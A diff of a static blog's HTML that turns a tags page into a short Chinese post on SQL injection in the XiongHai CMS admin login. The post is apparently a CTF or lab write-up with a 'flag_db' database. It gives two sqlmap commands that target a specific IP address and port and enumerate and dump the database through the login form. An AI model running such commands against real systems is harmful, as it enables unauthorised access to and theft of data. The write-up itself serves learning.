@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html><head>
-<title>Tags</title>
+<title>熊海 CMS 后台登录的 SQL 注入</title>
 
 
 
@@ -10,24 +10,26 @@
 <meta name="google-site-verification" content="">
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
 <meta content="telephone=no" name="format-detection">
-<meta name="description" content="">
+<meta name="description" content="管理员登录页面可以在不登陆的情况下用 SQL 注入泄露数据库信息">
 <meta name="renderer" content="webkit">
 <meta name="theme-color" content="#ffffff">
 
 
 
-<meta property="og:title" content="Tags" />
-<meta property="og:description" content="My HomePage Description" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://xxxhidexxx.github.io/tags/" /><meta property="og:site_name" content="My Blog" />
+<meta property="og:title" content="熊海 CMS 后台登录的 SQL 注入" />
+<meta property="og:description" content="管理员登录页面可以在不登陆的情况下用 SQL 注入泄露数据库信息" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/sqli4/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-02-12T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
 
 
 
 
 
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Tags"/>
-<meta name="twitter:description" content="My HomePage Description"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="熊海 CMS 后台登录的 SQL 注入"/>
+<meta name="twitter:description" content="管理员登录页面可以在不登陆的情况下用 SQL 注入泄露数据库信息"/>
 
 
 
@@ -54,6 +56,8 @@
 
 
 
+      <script src="/js/toc.js"></script>
+    
     <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
 
 <link rel="stylesheet" href="/scss/dark-mode.min.cb53f1bee2b8900cb4f082afbf00175d6618f281cf9a2fe8619e3b52d20b5721.css" integrity="sha256-y1PxvuK4kAy08IKvvwAXXWYY8oHPmi/oYZ47UtILVyE=" media="screen">
@@ -122,15 +126,73 @@
                 
                 
                 
-                    
                 
                 
-                
-                <a class="a-block drawer-menu-item active" href="/tags">
+                <a class="a-block drawer-menu-item false" href="/tags">
                     标签
                 </a>
                 
             
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e6%89%8b%e5%b7%a5%e6%b3%a8%e5%85%a5" class="nav-手工注入">
+									手工注入
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%94%a8-sqlmap-%e6%89%ab%e6%8f%8f" class="nav-用-sqlmap-扫描">
+									用 sqlmap 扫描
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
             
         </div>
     </div>
@@ -170,51 +232,99 @@
             <div id="content">
                 <div id="streamContainer" class="stream-container">
 
-<div class="post-list-container post-list-container-shadow">
-  <a class="a-block">
-    <div class="post-item-wrapper post-item-wrapper-no-hover">
-      <div class="post-item post-item-no-gaps">
-        <div class="post-item-info-wrapper">
-          <div class="post-item-title post-item-title-small">
-            Tags
-          </div>
-        </div>
-      </div>
-    </div>
-  </a>
-  <div class="tags">
-    
-    <div class="tag">
-      <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" class="btn btn-outline-secondary position-relative rounded-pill">
-        SQL 注入
-        <span class="badge">(3)</span>
-      </a>
-    </div>
-    
-    <div class="tag">
-      <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="btn btn-outline-secondary position-relative rounded-pill">
-        SQL注入
-        <span class="badge">(1)</span>
-      </a>
-    </div>
-    
-    <div class="tag">
-      <a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" class="btn btn-outline-secondary position-relative rounded-pill">
-        后端漏洞
-        <span class="badge">(4)</span>
-      </a>
-    </div>
-    
-    <div class="tag">
-      <a href="/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/" class="btn btn-outline-secondary position-relative rounded-pill">
-        网络设置
-        <span class="badge">(2)</span>
-      </a>
-    </div>
-    
-  </div>
-</div>
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
 
+            <div class="post-head-wrapper-text-only"
+                
+            >
+                <div class="post-title">
+                    熊海 CMS 后台登录的 SQL 注入
+                    
+                    <div class="post-subtitle">
+                        管理员登录页面可以在不登陆的情况下用 SQL 注入泄露数据库信息
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            2024-02-12 00:00
+                        </time>
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/sec">sec</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5">SQL注入</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E">后端漏洞</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h2 id="手工注入">手工注入</h2>
+<p><img src="/images/sqli1/sqli4-4.png" alt="sqli4"></p>
+<h2 id="用-sqlmap-扫描">用 sqlmap 扫描</h2>
+<p>使用的 sqlmap 语句如下。&ndash;forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。</p>
+<pre><code>sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs
+</code></pre>
+<p>&ndash;dbs 的意思是列出所有数据库名称</p>
+<pre><code>sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch -D flag_db --dump
+</code></pre>
+<p>-D 是指定数据库，&ndash;dump 是以文件形式导出。</p>
+<p><img src="/images/sqli1/sqli4-0.png" alt="sqli4"></p>
+<p><img src="/images/sqli1/sqli4-1.png" alt="sqli4"></p>
+<p><img src="/images/sqli1/sqli4-2.png" alt="sqli4"></p>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;">Last modified on 2024-02-12</p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts">
+			Next<br>No newer posts.
+                </a>
+                
+                
+                
+                <a class="older-posts" href="/posts/sec/kalinetwork/">
+			Previous<br>Kali Linux 网络设置
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+                <p style="opacity: 0.6" align="center">
+                    <small>Comments Disabled.</small>
+                </p>
+                
+            </div>
+        </div>
+    </div>
 
 
                     </div>
@@ -244,11 +354,9 @@
             
             
             
-                
             
             
-            
-            <a class="a-block nav-link-item active" href="/tags">
+            <a class="a-block nav-link-item false" href="/tags">
                 标签
             </a>
             
@@ -275,6 +383,66 @@ Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopene
     <div class="toc-wrapper">
         
 
+        
+        <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e6%89%8b%e5%b7%a5%e6%b3%a8%e5%85%a5" class="nav-手工注入">
+									手工注入
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%94%a8-sqlmap-%e6%89%ab%e6%8f%8f" class="nav-用-sqlmap-扫描">
+									用 sqlmap 扫描
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
         
     </div>
     <div class="pagination">
